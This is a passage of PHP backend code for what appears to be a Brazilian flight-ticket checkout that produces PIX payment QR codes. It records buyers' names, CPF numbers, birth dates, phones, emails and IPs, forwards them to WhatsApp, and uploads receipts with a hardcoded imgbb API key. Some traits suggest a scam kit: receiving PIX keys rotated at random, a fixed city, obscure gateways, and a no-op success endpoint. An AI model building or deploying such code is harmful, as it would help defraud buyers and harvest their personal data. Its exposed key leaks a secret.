        $utm_campaign = (!empty($_COOKIE['utm_campaign']) ? $_COOKIE['utm_campaign'] : (!empty($_SESSION['utm_campaign']) ? $_SESSION['utm_campaign'] : null));
        $utm_medium = (!empty($_COOKIE['utm_medium']) ? $_COOKIE['utm_medium'] : (!empty($_SESSION['utm_medium']) ? $_SESSION['utm_medium'] : null));
        $utm_content = (!empty($_COOKIE['utm_content']) ? $_COOKIE['utm_content'] : (!empty($_SESSION['utm_content']) ? $_SESSION['utm_content'] : null));
        $utm_term = (!empty($_COOKIE['utm_term']) ? $_COOKIE['utm_term'] : (!empty($_SESSION['utm_term']) ? $_SESSION['utm_term'] : null));

        $numero_pedido = str_pad(rand(0, 99999999), 8, "0", STR_PAD_LEFT);

        $stmtModo = $conexao->prepare("SELECT modo_pix, enviar_whatsapp FROM configuracoes WHERE id = 1");
        $stmtModo->execute();
        $config = $stmtModo->fetch(PDO::FETCH_ASSOC);
        if (!$config) {
            $config = ['modo_pix' => 'chave', 'enviar_whatsapp' => 0];
        }

        if ($config['modo_pix'] === 'api') {
            $stmtGateway = $conexao->prepare("SELECT nome FROM gateway_pix WHERE id = 1");
            $stmtGateway->execute();
            $gw = $stmtGateway->fetchColumn();

            if (!$gw) {
                salvarErro("Nenhuma gateway PIX cadastrada!");
                echo json_encode(['sucesso' => false,'mensagem' => 'Nenhuma gateway PIX cadastrada.']);
                exit;
            }

            $gateways = [
                'evopay' => './gateway_pix/Evopay.php', 
                //'blackcat' => './gateway_pix/Blackcat.php',
                'blackcatpagamentos.online' => './gateway_pix/Blackcat.php', 
                'lxpay' => './gateway_pix/LxPay.php',
                'pixup' => './gateway_pix/Pixup.php', 
                'pronttus' => './gateway_pix/Pronttus.php',
                'sigilopay' => './gateway_pix/Sigilopay.php', 
                'mercado_pago' => './gateway_pix/MercadoPago.php',
                'unicocash' => './gateway_pix/Unicocash.php', 
                'tryplo_pay' => './gateway_pix/TryploPay.php',
                'free_pay' => './gateway_pix/FreePay.php', 
                'titans_hub' => './gateway_pix/TitansHub.php',
                'payevo' => './gateway_pix/Payevo.php', 
                'podpay' => './gateway_pix/PodPay.php',
                'street_pay' => './gateway_pix/StreetPay.php', 
                'quantum_pay' => './gateway_pix/QuantumPay.php',
                'pague_x' => './gateway_pix/PagueX.php', 
                'pay_shark' => './gateway_pix/PayShark.php',
                'anubis_pay' => './gateway_pix/Anubispay.php', 
                'clyptpay' => './gateway_pix/ClyptPay.php',
                'centurion_pay' => './gateway_pix/CenturionPay.php', 
                'plumify' => './gateway_pix/Plumify.php',
                'tribo_pay' => './gateway_pix/TriboPay.php', 
                'marcha' => './gateway_pix/marchabb.php',
                'zyntra_pay' => './gateway_pix/ZyntraPay.php', 
                'asset' => './gateway_pix/Asset.php',
                'assetpay.com.br' => './gateway_pix/AssetPay.php', 
                'optimus_pay' => './gateway_pix/OptimusPay.php',
                'nuvia_pay' => './gateway_pix/NuviaPay.php',
                'cart_hero' => './gateway_pix/CartHero.php',
                'iron_pay' => './gateway_pix/IronPay.php',
                'rokify' => './gateway_pix/Rokity.php',
                'apx_pay' => './gateway_pix/ApxPay.php',
            ];

            $gw_nome = strtolower(trim($gw));

            if (!isset($gateways[$gw_nome])) {
                salvarErro("Gateway pix Não localizada, tente novamente ou cadastre outra");
                echo json_encode(['sucesso' => false,'mensagem' => 'Gateway PIX não reconhecida:']);
                exit;
            }

            $arquivoGateway = $gateways[$gw_nome];
            
            if (!file_exists($arquivoGateway)) {
                salvarErro("Grande erro chame o dev!");
                echo json_encode(['sucesso' => false,'mensagem' => 'Arquivo da gateway não encontrado:']);
                exit;
            }
                
                require_once $arquivoGateway;
                exit;
            }

        $stmt_pix = $conexao->prepare("SELECT id, chave, tipo, identificacao FROM pix WHERE usar = 1 ORDER BY RAND() LIMIT 1");
        $stmt_pix->execute();
        $dados_pix = $stmt_pix->fetch(PDO::FETCH_ASSOC);

        if (!$dados_pix || empty(trim($dados_pix['chave'] ?? ''))) {
            $stmt_ultimo = $conexao->prepare("SELECT id, chave, tipo, identificacao FROM pix ORDER BY id DESC LIMIT 1");
            $stmt_ultimo->execute();
            $dados_pix = $stmt_ultimo->fetch(PDO::FETCH_ASSOC);
        }

        $chave_original = trim($dados_pix['chave']);
        $tipo = strtoupper($dados_pix['tipo'] ?? '');

        switch ($tipo) {
            case 'CPF':
            case 'CNPJ':
                $chave_usada = preg_replace('/[^0-9]/', '', $chave_original);
                break;
            case 'TELEFONE':
                $numero = preg_replace('/[^0-9]/', '', $chave_original);
                if (strpos($numero, '55') === 0) $numero = substr($numero, 2);
                $chave_usada = (strlen($numero) === 10 || strlen($numero) === 11) ? '+55' . $numero : '+55' . substr($numero, -11);
                break;
            case 'EMAIL':
            case 'ALEATORIA':
                $chave_usada = strtolower(trim($chave_original));
                break;
            default:
                $chave_usada = $chave_original;
        }

        $beneficiario = substr(trim($dados_pix['identificacao'] ?? 'PAGAMENTO'), 0, 25);
        $cidade = 'SAO PAULO';
        $txid = 'TX' . rand(100000, 999999);

        $px = [
            '00' => '01',
            '26' => ['00' => 'br.gov.bcb.pix', '01' => $chave_usada, '02' => 'PAGAMENTO'],
            '52' => '0000',
            '53' => '986',
            '54' => $valor_final,
            '58' => 'BR',
            '59' => $beneficiario,
            '60' => $cidade,
            '62' => ['05' => $txid],
        ];

        $payload = montaPix($px) . "6304" . crc16(montaPix($px) . "6304");

        ob_start();
        QRcode::png($payload, null, QR_ECLEVEL_L, 5);
        $imageString = ob_get_contents();
        ob_end_clean();
        $base64png = "data:image/png;base64," . base64_encode($imageString);

        $status = 'pendente';
        $data_agora = date('d/m/Y H:i');

        $conexao->query("UPDATE relatorio SET visitas = visitas + 1 WHERE id = 1");

        $stmtInfospix = $conexao->prepare("INSERT INTO infospix (nome, documento, nascimento, telefone, email, pedido, passageiros, origem, destino, fullid, status, data, dispositivo, chave_pix, tipo, classe, data_de_ida, data_de_volta, navegador, ip, valor, utm_source, utm_campaign, utm_medium, utm_content, utm_term) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

        $stmtInfospix->execute([
            $nome, 
            $documento, 
            $nascimento, 
            $telefone, 
            $email, 
            $numero_pedido, 
            $passageiros, 
            $origem, 
            $destino, 
            $fullid, 
            $status, 
            $data_agora, 
            $dispositivo, 
            $chave_original, 
            $tipo_do_voo, 
            $classe, 
            $data_de_ida, 
            $data_de_volta, 
            $navegador, 
            $ip, 
            $valor_final, 
            $utm_source, 
            $utm_campaign,
            $utm_medium,
            $utm_content,
            $utm_term
        ]);

        echo json_encode([
            "sucesso" => true,
            "código_pix" => $payload,
            "qr_code_pix" => $base64png,
            "valor" => $valor_final,
            "numero_do_pedido" => $numero_pedido
        ], JSON_UNESCAPED_UNICODE);

        if ($config && $config["enviar_whatsapp"] == 1) {
            $zapData = [
                "nome" => $nome,
                "cpf" => $documento,
                "telefone" => $telefone,
                "valor" => $valor_final,
                "pedido" => $numero_pedido,
                "pix" => $payload,
                "qrcode" => $base64png
            ];

            $__JSON_INPUT__ = json_encode($zapData);
            require __DIR__ . '/enviar_whatsapp.php';
        }
        exit;

    } catch (Exception $e) {
        echo json_encode(["sucesso" => false, "mensagem" => "Erro interno"], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

if (isset($data['metodo']) && $data['metodo'] === 'gerar_boleto') {
    http_response_code(403);
    echo json_encode([
        "erro" => true,
        "mensagem" => "Pagamento por boleto está desativado."
    ]);
    exit;
}

//colocar codigos php aq!

$data = $_POST;

if (!is_array($data) || empty($data)) {
    $data = $_POST;
}

if (isset($data['metodo']) && $data['metodo'] === 'receber_comprovantes_de_pagamento') {
    echo json_encode(["sucesso" => true]);
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'enviar_comprovante_de_pagamento') {
    
    if (!isset($_FILES['arquivo']) || $_FILES['arquivo']['error'] !== 0) {
        echo json_encode(["sucesso"=>false,"erro"=>"Nenhum arquivo enviado"]);
        exit;
    }

    if (!isset($data['numero_do_pedido']) || empty($data['numero_do_pedido'])) {
        echo json_encode(["sucesso"=>false,"erro"=>"Número do pedido não informado"]);
        exit;
    }

    $numeroPedido = $data['numero_do_pedido'];

    $ext = strtolower(pathinfo($_FILES['arquivo']['name'], PATHINFO_EXTENSION));
    $permitidos = ['jpg', 'jpeg', 'png', 'webp'];

    if (!in_array($ext, $permitidos)) {
        echo json_encode(["sucesso"=>false,"erro"=>"Formato inválido"]);
        exit;
    }

    $apiKey = '8ccaffb702e0f19fcb7b1b5c2042806d';

    $fileData = base64_encode(file_get_contents($_FILES['arquivo']['tmp_name']));
    $filename = pathinfo($_FILES['arquivo']['name'], PATHINFO_FILENAME);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.imgbb.com/1/upload?key=$apiKey");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'image' => $fileData,
        'name'  => $filename
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $result = json_decode($response, true);

    if (!isset($result['data']['url'])) {
        echo json_encode(["sucesso"=>false,"erro"=>"Falha ao hospedar imagem"]);
        exit;
    }

    $link = $result['data']['url'];

    try {
        $stmt = $conexao->prepare("UPDATE infospix SET comprovante = :caminho WHERE pedido = :pedido");
        $stmt->bindValue(':caminho', $link);
        $stmt->bindValue(':pedido', $numeroPedido);
        $stmt->execute();

        if ($stmt->rowCount() > 0) {
            echo json_encode(["sucesso"=>true, "mensagem"=>"Comprovante salvo com sucesso"]);
        } else {
            echo json_encode(["sucesso"=>false,"erro"=>"Pedido não encontrado"]);
        }
        exit;

    } catch (PDOException $e) {
    erroAPI("Erro ao salvar no banco: " . $e->getMessage());
    }
}
// Não colocar nenhum codigo php aq!
exit('NOT FOUND');